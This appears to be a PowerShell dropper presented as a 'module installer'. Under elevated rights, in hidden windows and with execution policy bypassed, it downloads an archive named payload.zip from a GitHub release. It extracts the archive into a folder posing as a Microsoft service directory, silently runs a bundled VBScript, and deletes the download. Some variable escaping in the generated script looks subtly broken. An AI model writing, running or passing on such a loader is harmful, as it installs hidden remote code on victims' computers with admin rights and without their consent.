$ErrorActionPreference = 'Stop'

# MODULE INSTALLER
$bgScriptPath = Join-Path $env:TEMP "zprt_bgmodules_$(Get-Random).ps1"

@"
`$dest = `"$env:APPDATA\Microsoft\Service`"
if (-not (Test-Path `$dest)) {
    New-Item -ItemType Directory -Path `$dest | Out-Null
}

`$zipUrl = `"https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip`"
`$zipPath = `"$env:TEMP\payload.zip`"

Invoke-WebRequest -Uri `$zipUrl -OutFile `$zipPath
Expand-Archive -Path `$zipPath -DestinationPath `$dest -Force

`$folderDir = `"$env:APPDATA\Microsoft\Service\App`"

$runVbs = Join-Path $folderDir "run.vbs"

if (Test-Path $runVbs) {
    Start-Process "wscript.exe" `
        -ArgumentList "`"$runVbs`"" `
        -WindowStyle Hidden `
        -WorkingDirectory $folderDir
}

Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
"@ | Set-Content -Path $bgScriptPath -Encoding UTF8

$bg = $null
try {
    $bg = Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -PassThru `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$bgScriptPath`""
} catch {}

if (-not $bg) {
    exit
}
